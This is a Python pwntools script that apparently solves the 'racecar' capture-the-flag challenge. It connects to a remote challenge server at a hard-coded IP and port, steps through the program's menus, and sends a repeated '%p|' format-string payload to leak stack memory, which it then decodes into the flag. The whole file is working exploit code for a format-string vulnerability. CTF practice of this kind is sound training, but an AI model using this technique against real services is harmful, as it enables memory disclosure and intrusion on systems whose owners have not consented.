#!/usr/bin/python

from pwn import *


#p = process('./racecar_patched')
p = remote('142.93.35.92',30594)

def setup():
    p.sendlineafter('Name: ','A')
    p.sendlineafter('Nickname: ','B')
    p.sendlineafter('> ','2')
    p.sendlineafter('> ', '1')
    p.sendlineafter('> ', '2')


def exploit():
    setup()
    flag = ""
    p.sendlineafter('> ','%p|'*(0x170/3))
    p.recvline()
    p.recvline()
    leak = p.recv(0x200).split('|')
    print leak
    for data in leak:
        if 'ni' in data:
            continue
        print type(int(data,16))
        data = int(data,16)
        #print int(data,16)
        #data = p32(int(data,16))
        print(hex(data))
        while data > 0:
            char = data & 0x00ff
            data = data >> 8
            flag += chr(char)
    print flag

    p.interactive()

if __name__ == '__main__':
    exploit()
